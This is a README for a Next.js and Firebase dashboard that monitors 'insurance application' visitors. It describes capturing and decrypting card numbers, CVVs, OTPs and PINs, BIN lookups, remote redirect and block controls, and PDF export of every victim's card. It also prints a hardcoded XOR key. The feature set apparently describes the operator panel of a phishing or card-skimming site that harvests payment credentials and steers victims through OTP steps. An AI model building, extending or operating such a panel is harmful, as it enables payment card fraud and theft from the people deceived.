# Emad BeCare Dashboard

## Overview
A Next.js admin dashboard with Firebase integration for real-time monitoring of insurance application visitors. Features visitor tracking, payment data monitoring (cards, OTPs, PINs), remote flow control, and PDF export. Arabic RTL layout, no authentication required.

## Tech Stack
- **Framework**: Next.js 15.5.x
- **Language**: TypeScript
- **Styling**: Tailwind CSS 3.4 with tailwindcss-animate
- **Database**: Firebase Firestore (project: tmnrs-1e680)
- **PDF**: html2pdf.js
- **Fonts**: Cairo, Tajawal (Google Fonts)

## Project Structure
```
app/
├── api/analytics/    # Analytics API routes
├── login/           # Login page
├── page.tsx         # Main dashboard
├── layout.tsx       # Root layout (includes ZoomFontControls)
└── globals.css      # Global styles (Tajawal font, RTL base)
components/
├── dashboard-header.tsx    # Top bar with stats + export button
├── visitor-sidebar.tsx     # Visitor list sidebar
├── visitor-details.tsx     # Detail panel with nav dropdown
├── data-bubble.tsx         # Card visual + BIN data + PIN/OTP display
├── bin-info.tsx            # BIN lookup API + useBinData hook
├── theme-provider.tsx      # Dark/light theme context + toggle
├── zoom-font-controls.tsx  # Floating zoom/font/theme control widget
├── settings-modal.tsx      # Settings
├── visitor-tracking-info.tsx
├── visitor-redirect.tsx
└── block-control.tsx
lib/
├── firebase.ts             # Firebase config (tmnrs-1e680)
├── firebase-services.ts    # Firestore CRUD operations
├── firestore-types.ts      # TypeScript types
├── secure-utils.ts         # XOR encrypt/decrypt (primary)
├── decrypt-utils.ts        # XOR decrypt + field labels
├── decrypt-data.ts         # XOR decrypt for visitor data
├── generate-pdf.ts         # PDF generation (card mockup + full report)
├── pdf-logo.ts             # Base64 logo for PDF
├── pdf-stamp.ts            # Base64 stamp for PDF
├── history-actions.ts      # History management
└── time-utils.ts           # Time formatting utilities
scripts/
└── post-merge.sh           # Post-merge setup (npm install)
```

## Dark/Light Mode
- Theme toggle via `ThemeProvider` context (localStorage-persisted)
- Toggle button in bottom-left corner alongside zoom/font controls
- Tailwind `darkMode: ['class']` — toggling `.dark` class on `<html>`
- All major components have `dark:` variants for backgrounds, text, borders
- CSS variables in `globals.css` define both light (`:root`) and dark (`.dark`) palettes

## Encryption
All sensitive data (card numbers, CVV, OTP, PIN) is XOR + Base64 encrypted.
- **Key**: `bU1xIx4Mae0QKiKTcy$DHv3$gsu#VXu4` (synced across all 3 decrypt files)
- Main site encrypts → Firebase stores → Dashboard decrypts
- Unicode-safe base64 encoding used for Arabic text support

## PDF Export
- **Single card PDF**: Dark navy card mockup with all data (card number, expiry, CVV, bank, OTP/PIN)
- **Export all cards**: One card mockup per page for all visitors with card data
- **Full visitor report**: Complete report with all sections (insurance, payment, verification)

## ZoomFontControls
Floating widget (⚙ gear, bottom-left) with zoom (50-150%) and font size (12-36px) sliders. Height compensation applied when zooming out to fill viewport.

## Development
- **Dev Server**: `npm run dev` (port 5000)
- **Build**: `npm run build`
